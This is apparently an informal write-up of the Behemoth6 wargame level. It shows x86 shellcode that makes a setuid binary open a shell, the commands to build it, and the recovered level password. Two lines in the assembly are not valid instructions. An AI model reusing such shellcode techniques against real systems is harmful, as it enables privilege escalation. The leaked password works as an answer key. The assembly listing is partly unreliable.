we see in disassebmly of behemoth6 that if strcmp is true we get shell  
we see that it comperes to:  
HelloKitty ==  
and we see that behemoth6 executes behemoth6_reader  
so we go to behemoth6_reader:  
we see call *%eax --> executing our code from shellcode.txt  
writing in c, it says: write your own shellcode  
we dig in and see that if we use 0x0b in our code it says: write your own   
shellcode, so we have to write in assembly:
```assembly
[SECTION .text]

global _start

_start:
    jmp short getmsg

printmsg:
    xor eax,eax
    xor ebx,ebx
    xor ecx,ecx
    xor edx,edx
    printing "HelloKitty";
    mov al, 0x4
    mov bl, 0x1
    pop ecx
    mov dl, 0xa
    int 0x80

    printing "\n";
    xor eax, eax
    mov al, 0x1
    xor ebx,ebx
    int 0x80

getmsg:
    call printmsg
    db 'HelloKitty', '$'
```
we compile that asm:
```sh
nasm -f elf kitty.asm -o kitty.o
ld -m elf_i386 kitty.o -o kitty
```

we try that, but still get write your own shellcode
so we cat it and see additional information about the run env that we dont 
need, so we copy just the opcodes with objdump -d kitty and echoing the opcodes

at last, it works and we get:
baquoxuafo
